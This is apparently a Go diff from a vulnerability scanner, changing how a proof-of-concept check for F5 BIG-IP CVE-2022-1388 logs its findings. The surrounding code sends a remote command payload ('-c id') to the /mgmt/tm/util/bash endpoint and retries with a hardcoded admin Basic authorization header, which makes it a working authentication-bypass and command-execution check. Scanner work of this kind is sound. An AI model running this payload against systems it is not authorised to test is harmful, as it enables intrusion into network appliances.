@@ -1,7 +1,6 @@
 package f5
 
 import (
-	"fmt"
 	"github.com/hktalent/scan4all/lib/util"
 )
 
@@ -16,13 +15,13 @@ func CVE_2022_1388(u string) bool {
 	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
 	if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
 		if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
-			util.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+			util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP", data)
 			return true
 		} else {
 			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
 			if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
 				if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
-					util.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+					util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP", data)
 					return true
 				}
 			} else {
@@ -32,7 +31,7 @@ func CVE_2022_1388(u string) bool {
 				header2["Content-Type"] = "application/json"
 				if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header2); err == nil {
 					if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
-						util.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+						util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP ", data)
 						return true
 					}
 				}
